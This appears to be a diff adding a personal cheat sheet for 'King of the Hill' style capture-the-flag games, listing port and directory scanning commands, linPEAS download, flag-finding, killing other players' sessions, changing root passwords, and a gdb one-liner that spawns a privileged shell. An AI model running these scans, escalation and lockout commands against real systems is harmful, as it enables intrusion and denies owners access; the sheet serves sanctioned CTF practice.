@@ -1,0 +1,143 @@
+############################################################
+###############  Setup Attack Box ##########################
+############################################################
+Name		OS
+Shrek		linux 
+Panda		linux
+Production	linux 
+Food		linux 
+Tyler		linux 
+Fortune		linux 
+Hackers		linux 
+Carnage		linux 
+Offline		windows 
+Hogwarts	linux 
+H1: Medium	windows 
+H1: Easy	linux 
+H1: Hard	linux 
+Fireworks	linux 
+
+; sequential execution   & background execution immediatly starts next command
+&& runs second if first exits clean   || OR runs second if first fails
+|  output of first is stdin to second   |& sends stdin and stderr into second cmd
+(cmd1; cmd2)  #runs in subshell variable changes don't effect parent
+{ cmd1; cmd2; } # runs in current shell — note the required spaces and trailing semicolon
+
+cmd > file      # stdout to file (overwrite)
+cmd >> file     # stdout to file (append)
+cmd 2> file     # stderr to file
+cmd 2>&1        # redirect stderr to same place as stdout
+cmd < file      # stdin from file
+cmd <<< "text"  # here-string, feed text as stdin
+
+
+#Linpeas Binaries Page
+https://github.com/peass-ng/PEASS-ng/releases
+
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20260624-872a1386/linpeas.sh & wget https://github.com/peass-ng/PEASS-ng/releases/download/20260624-872a1386/linpeas_small.sh & snap install feroxbuster & snap install rustscan
+
+###############   Start Python Webserver ###################
+python3 -m http.server 8000
+
+snap install feroxbuster
+snap install rustscan
+
+
+
+############################################################
+###############  Scanning Commands #########################
+############################################################
+#https://www.hackingarticles.in/ctf-challenges-walkthrough/
+tip=<target.ip>
+ping $tip         #Ensure connectivity
+#quick rust scan all ports followed by nmap -A does -sV -sC -0 --traceroute
+rustscan -a $tip -b 5000 -r 1-65535 -- -A -n -T4 --max-retries 1 --min-rate 1000 
+
+#if 127 error occurs
+rustscan -a $tip -b 5000 -r 1-65535 -g
+nmap -p <ports> -A -n -T4 --max-retries 1 --min-rate 1000 $tip
+
+#If web server is up
+ffuf -u http://$tip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.html -t 100 -c
+#after ffuf is done run this next
+feroxbuster -u http://$tip/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
+
+#FTP  
+ftp $tip
+anonymous    OR    ftp   as username
+ls
+cd <directory>
+get <filename>
+put <filename>
+exit     OR    bye       #close connection
+
+ 
+#quick dirsearch, then filtered, then ignoring invalid SSL, then more comprehensive
+dirsearch -u http://$tip -t 100 -e php,txt
+dirsearch -u http://$tip -x 403,500,503
+dirsearch -u http://$tip -e php,txt,html,json,zip,bak
+dirsearch -u http://$tip -w /usr/share/wordlists/dirb/common.txt
+
+feroxbuster -u http://$tip/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -n -t 100
+
+Scan a specific port range: 
+rustscan -a 192.168.1.1 --range 1-1000
+Scan multiple IPs: 
+rustscan -a 192.168.1.1,192.168.1.5
+Scan a subnet (CIDR): 
+rustscan -a 192.168.1.0/24
+Speed/Batch Tuning: If RustScan is missing ports due to system limitations, you can adjust the batch size (-b) and timeout (-T):bash
+rustscan -a 192.168.1.1 -b 500 -T 1500
+
+#GoBuster Quick
+gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -t 100
+
+#GoBuster extensive
+gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html
+
+
+
+##################   After access   #############################
+
+ 
+
+who		#list all current users and their active terminal sessions
+hostname
+sudo -l
+firefox & disown    #spawn firefox and return to terminal prompt
+# in firefox   search gtfobins
+
+ps aux | grep pts           #lists process controlling terminals
+pkill -9 -t pts/1           #kills pts/1
+kill -9 PID					#terminate their session using their process ID instead
+
+ss -tupn    #List all active network connections and process running them
+netstat -tupn       
+
+##################   After Root     #############################
+#Once root is acheived
+
+passwd              #change root password
+#Find all flags on the machine
+find / -type f \( -name "flag*.txt" -o -name "user.txt" -o -name "root.txt" \) -exec head -n +1 {} \; 2>/dev/null
+
+#Change user and root passwords immediately using a single line
+echo -e "yournewpassword\nyournewpassword" | passwd root
+
+sudo chattr +i filename.txt   #set immutable Flag
+sudo chattr -i filename.txt   #unset immutable Flag
+
+
+
+find / -type f \( -name "flag*.txt" -o -name "user.txt" -o -name "root.txt" \) -exec head -n +1 {} \; 2>/dev/null
+
+#Remove SUID permissions from binary files that players abuse for privilege #escalation (like find, base64, or cp):
+  ```bash
+  chmod -s $(which find)
+#Check common persistence locations like /etc/cron*, /etc/crontab, and #authorized SSH keys inside /root/.ssh/authorized_keys to ensure opponents #haven't left a backdoor to get right back in.
+
+gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+
+
+echo username > /home/king.txt
+echo username > /root/king.txt
